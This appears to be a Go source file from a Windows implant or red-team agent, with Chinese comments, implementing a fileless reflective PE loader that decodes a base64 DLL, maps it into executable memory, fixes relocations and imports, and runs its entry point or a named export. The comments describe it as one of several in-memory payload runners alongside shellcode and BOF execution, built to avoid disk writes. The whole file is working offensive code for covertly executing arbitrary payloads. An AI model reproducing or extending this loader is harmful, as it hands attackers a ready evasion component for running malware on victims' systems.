//go:build windows

package main

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// 全内存无文件执行管道 —— 反射式 PE 加载器。
//
// 目标：接收 base64 编码的 DLL/EXE 二进制后，不经过任何磁盘写入（不落盘、不走
// LoadLibrary(路径)），直接在内存中完成映射、基址重定位与导入表解析，然后调用入口点。
// 与 loadShellcode（VirtualAlloc + CreateThread）、loadBOF（内存 COFF 执行）共同构成
// shellcode / BOF / DLL 三类载荷的无文件执行能力。

const (
	dllProcessAttach = 1
	peMagic32        = 0x10B
	peMagic64        = 0x20B
)

type memSection struct {
	virtualAddress uint32
	virtualSize    uint32
	rawSize        uint32
	rawOffset      uint32
}

type memPE struct {
	is64          bool
	preferredBase uint64
	sizeOfImage   uint32
	sizeOfHeaders uint32
	entryRVA      uint32
	sections      []memSection
	numDataDirs   uint32
	dataDirOff    int
	exportRVA     uint32
	exportSize    uint32
	importRVA     uint32
	importSize    uint32
	relocRVA      uint32
	relocSize     uint32
}

// loadDLLMem 反射加载 DLL：映射到内存、修复重定位与导入表后调用入口点，全程不落盘。
func loadDLLMem(dataB64, entryName string) (string, int32, string) {
	raw, err := base64.StdEncoding.DecodeString(dataB64)
	if err != nil {
		return "", -1, fmt.Sprintf("base64 decode failed: %v", err)
	}
	base, info, err := reflectLoadPE(raw)
	if err != nil {
		return "", -1, fmt.Sprintf("reflective load failed: %v", err)
	}

	// 调用 DLL 入口点（即 DllMain）：DllMain(hinstDLL, DLL_PROCESS_ATTACH, 0)
	if info.entryRVA != 0 {
		_, _, _ = syscall.SyscallN(base+uintptr(info.entryRVA), base, uintptr(dllProcessAttach), 0)
	}

	// 可选：调用指定导出函数（无参）
	if entryName != "" {
		if fn, e := resolveExport(base, info, entryName); e == nil {
			_, _, _ = syscall.SyscallN(fn)
		}
	}

	return fmt.Sprintf("DLL reflectively loaded at 0x%x (%d bytes)", base, len(raw)), 0, ""
}

func reflectLoadPE(raw []byte) (uintptr, *memPE, error) {
	info, err := parseMemPE(raw)
	if err != nil {
		return 0, nil, err
	}

	base, err := windows.VirtualAlloc(0, uintptr(info.sizeOfImage), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return 0, nil, fmt.Errorf("VirtualAlloc failed: %w", err)
	}

	// 拷贝头
	copyMem(base, raw, int(info.sizeOfHeaders))
	// 拷贝节
	for _, s := range info.sections {
		if s.rawSize == 0 || int(s.rawOffset)+int(s.rawSize) > len(raw) {
			continue
		}
		copyMem(base+uintptr(s.virtualAddress), raw[int(s.rawOffset):int(s.rawOffset)+int(s.rawSize)], int(s.rawSize))
	}

	if err := applyRelocs(base, info); err != nil {
		return 0, nil, err
	}
	if err := resolveImports(base, info); err != nil {
		return 0, nil, err
	}

	// 刷新指令缓存（x86/x64 上通常为空操作，ARM 上必需）
	resolveAPI("kernel32.dll", "FlushInstructionCache").Call(^uintptr(0), base, uintptr(info.sizeOfImage))

	return base, info, nil
}

// parseMemPE 解析 PE 头（DOS/NT 头、可选头、节表、数据目录）。
func parseMemPE(raw []byte) (*memPE, error) {
	if len(raw) < 0x40 {
		return nil, fmt.Errorf("PE too short")
	}
	if binary.LittleEndian.Uint16(raw[0:2]) != 0x5A4D { // "MZ"
		return nil, fmt.Errorf("bad MZ magic")
	}
	eLfanew := int(binary.LittleEndian.Uint32(raw[0x3C:0x40]))
	if eLfanew+4+20 > len(raw) {
		return nil, fmt.Errorf("bad e_lfanew")
	}
	if binary.LittleEndian.Uint32(raw[eLfanew:eLfanew+4]) != 0x00004550 { // "PE\0\0"
		return nil, fmt.Errorf("bad PE signature")
	}

	fileHdr := eLfanew + 4
	optHdr := fileHdr + 20
	magic := binary.LittleEndian.Uint16(raw[optHdr : optHdr+2])

	info := &memPE{}
	switch magic {
	case peMagic32:
		info.is64 = false
		info.preferredBase = uint64(binary.LittleEndian.Uint32(raw[optHdr+28 : optHdr+32]))
		info.numDataDirs = binary.LittleEndian.Uint32(raw[optHdr+92 : optHdr+96])
		info.dataDirOff = optHdr + 96
	case peMagic64:
		info.is64 = true
		info.preferredBase = binary.LittleEndian.Uint64(raw[optHdr+24 : optHdr+32])
		info.numDataDirs = binary.LittleEndian.Uint32(raw[optHdr+108 : optHdr+112])
		info.dataDirOff = optHdr + 112
	default:
		return nil, fmt.Errorf("bad PE optional header magic 0x%x", magic)
	}

	info.entryRVA = binary.LittleEndian.Uint32(raw[optHdr+16 : optHdr+20])
	info.sizeOfImage = binary.LittleEndian.Uint32(raw[optHdr+56 : optHdr+60])
	info.sizeOfHeaders = binary.LittleEndian.Uint32(raw[optHdr+60 : optHdr+64])

	numSections := int(binary.LittleEndian.Uint16(raw[fileHdr+2 : fileHdr+4]))
	sizeOpt := int(binary.LittleEndian.Uint16(raw[fileHdr+16 : fileHdr+18]))
	secOff := optHdr + sizeOpt

	// 数据目录：index 0 = export, 1 = import, 5 = reloc
	dd := info.dataDirOff
	if info.numDataDirs >= 1 && dd+8 <= len(raw) {
		info.exportRVA = binary.LittleEndian.Uint32(raw[dd : dd+4])
		info.exportSize = binary.LittleEndian.Uint32(raw[dd+4 : dd+8])
	}
	if info.numDataDirs >= 2 && dd+16 <= len(raw) {
		info.importRVA = binary.LittleEndian.Uint32(raw[dd+8 : dd+12])
		info.importSize = binary.LittleEndian.Uint32(raw[dd+12 : dd+16])
	}
	if info.numDataDirs >= 6 && dd+48 <= len(raw) {
		info.relocRVA = binary.LittleEndian.Uint32(raw[dd+40 : dd+44])
		info.relocSize = binary.LittleEndian.Uint32(raw[dd+44 : dd+48])
	}

	for i := 0; i < numSections; i++ {
		off := secOff + i*40
		if off+40 > len(raw) {
			break
		}
		info.sections = append(info.sections, memSection{
			virtualSize:    binary.LittleEndian.Uint32(raw[off+8 : off+12]),
			virtualAddress: binary.LittleEndian.Uint32(raw[off+12 : off+16]),
			rawSize:        binary.LittleEndian.Uint32(raw[off+16 : off+20]),
			rawOffset:      binary.LittleEndian.Uint32(raw[off+20 : off+24]),
		})
	}

	return info, nil
}

// applyRelocs 应用基址重定位（delta = 实际基址 - 首选基址）。
func applyRelocs(base uintptr, info *memPE) error {
	if info.relocRVA == 0 || info.relocSize == 0 {
		return nil
	}
	delta := int64(base) - int64(info.preferredBase)
	if delta == 0 {
		return nil
	}

	off := info.relocRVA
	end := info.relocRVA + info.relocSize
	for off+8 <= end {
		pageRVA := binary.LittleEndian.Uint32(memBytes(base, off, 4))
		blockSize := binary.LittleEndian.Uint32(memBytes(base, off+4, 4))
		if blockSize == 0 {
			break
		}
		count := (blockSize - 8) / 2
		for i := uint32(0); i < count; i++ {
			entry := binary.LittleEndian.Uint16(memBytes(base, off+8+i*2, 2))
			typ := entry >> 12
			val := uint32(entry & 0x0FFF)
			addr := base + uintptr(pageRVA+val)
			switch typ {
			case 0: // IMAGE_REL_BASED_ABSOLUTE
			case 3: // IMAGE_REL_BASED_HIGHLOW (32-bit)
				p := int64(binary.LittleEndian.Uint32(memBytes(base, pageRVA+val, 4))) + delta
				binary.LittleEndian.PutUint32(memBytes(base, pageRVA+val, 4), uint32(p))
			case 10: // IMAGE_REL_BASED_DIR64 (64-bit)
				p := int64(binary.LittleEndian.Uint64(memBytes(base, pageRVA+val, 8))) + delta
				binary.LittleEndian.PutUint64(memBytes(base, pageRVA+val, 8), uint64(p))
			}
			_ = addr
		}
		off += blockSize
	}
	return nil
}

// resolveImports 解析导入表：LoadLibrary 各依赖 DLL 并填充 IAT。
func resolveImports(base uintptr, info *memPE) error {
	if info.importRVA == 0 {
		return nil
	}
	procGetProcAddress := resolveAPI("kernel32.dll", "GetProcAddress")
	procLoadLibraryA := resolveAPI("kernel32.dll", "LoadLibraryA")

	descRVA := info.importRVA
	for {
		originalFirstThunk := binary.LittleEndian.Uint32(memBytes(base, descRVA, 4))
		nameRVA := binary.LittleEndian.Uint32(memBytes(base, descRVA+12, 4))
		firstThunkRVA := binary.LittleEndian.Uint32(memBytes(base, descRVA+16, 4))
		if nameRVA == 0 && originalFirstThunk == 0 && firstThunkRVA == 0 {
			break
		}
		dllName := cstringAt(base, nameRVA)
		if dllName == "" {
			break
		}

		nameBytes := []byte(dllName + "\x00")
		hModule, _, _ := procLoadLibraryA.Call(uintptr(unsafe.Pointer(&nameBytes[0])))
		if hModule == 0 {
			return fmt.Errorf("import: LoadLibrary(%s) failed", dllName)
		}

		step := uint32(4)
		if info.is64 {
			step = 8
		}
		lookupRVA := firstThunkRVA
		if originalFirstThunk != 0 {
			lookupRVA = originalFirstThunk
		}
		iatRVA := firstThunkRVA
		for {
			thunk := readThunk(base, lookupRVA, info.is64)
			if thunk == 0 {
				break
			}

			var addr uintptr
			if thunk&0x8000000000000000 != 0 { // ordinal (PE32+ bit63)
				addr, _, _ = procGetProcAddress.Call(hModule, uintptr(thunk&0xFFFF))
			} else if !info.is64 && thunk&0x80000000 != 0 { // ordinal (PE32 bit31)
				addr, _, _ = procGetProcAddress.Call(hModule, uintptr(thunk&0xFFFF))
			} else {
				nameRVA := uint32(thunk & 0xFFFFFFFF)
				procName := cstringAt(base, nameRVA+2) // 跳过 2 字节 hint
				pn := []byte(procName + "\x00")
				addr, _, _ = procGetProcAddress.Call(hModule, uintptr(unsafe.Pointer(&pn[0])))
			}
			if addr == 0 {
				return fmt.Errorf("import: GetProcAddress failed in %s", dllName)
			}
			writeThunk(base, iatRVA, info.is64, addr)

			lookupRVA += step
			iatRVA += step
		}
		descRVA += 20
	}
	return nil
}

// resolveExport 在导出表中按名称查找导出函数地址。
func resolveExport(base uintptr, info *memPE, name string) (uintptr, error) {
	if info.exportRVA == 0 {
		return 0, fmt.Errorf("no export table")
	}
	numNames := binary.LittleEndian.Uint32(memBytes(base, info.exportRVA+24, 4))
	addrOfFunctions := binary.LittleEndian.Uint32(memBytes(base, info.exportRVA+28, 4))
	addrOfNames := binary.LittleEndian.Uint32(memBytes(base, info.exportRVA+32, 4))
	addrOfOrdinals := binary.LittleEndian.Uint32(memBytes(base, info.exportRVA+36, 4))

	for i := uint32(0); i < numNames; i++ {
		nameRVA := binary.LittleEndian.Uint32(memBytes(base, addrOfNames+i*4, 4))
		if cstringAt(base, nameRVA) == name {
			ord := binary.LittleEndian.Uint16(memBytes(base, addrOfOrdinals+i*2, 2))
			fnRVA := binary.LittleEndian.Uint32(memBytes(base, addrOfFunctions+uint32(ord)*4, 4))
			return base + uintptr(fnRVA), nil
		}
	}
	return 0, fmt.Errorf("export %q not found", name)
}

// ─── 内存访问辅助 ───────────────────────────────────────────────────────────────

func memBytes(base uintptr, rva uint32, n int) []byte {
	return (*[1 << 30]byte)(unsafe.Pointer(base + uintptr(rva)))[:n]
}

func copyMem(dst uintptr, src []byte, n int) {
	if n <= 0 || n > len(src) {
		return
	}
	dstPtr := (*[1 << 30]byte)(unsafe.Pointer(dst))
	copy(dstPtr[:n], src[:n])
}

func cstringAt(base uintptr, rva uint32) string {
	b := (*[1 << 30]byte)(unsafe.Pointer(base + uintptr(rva)))
	out := make([]byte, 0, 64)
	for i := 0; i < 4096; i++ {
		if b[i] == 0 {
			break
		}
		out = append(out, b[i])
	}
	return string(out)
}

func readThunk(base uintptr, rva uint32, is64 bool) uint64 {
	if is64 {
		return binary.LittleEndian.Uint64(memBytes(base, rva, 8))
	}
	return uint64(binary.LittleEndian.Uint32(memBytes(base, rva, 4)))
}

func writeThunk(base uintptr, rva uint32, is64 bool, val uintptr) {
	if is64 {
		binary.LittleEndian.PutUint64(memBytes(base, rva, 8), uint64(val))
	} else {
		binary.LittleEndian.PutUint32(memBytes(base, rva, 4), uint32(val))
	}
}
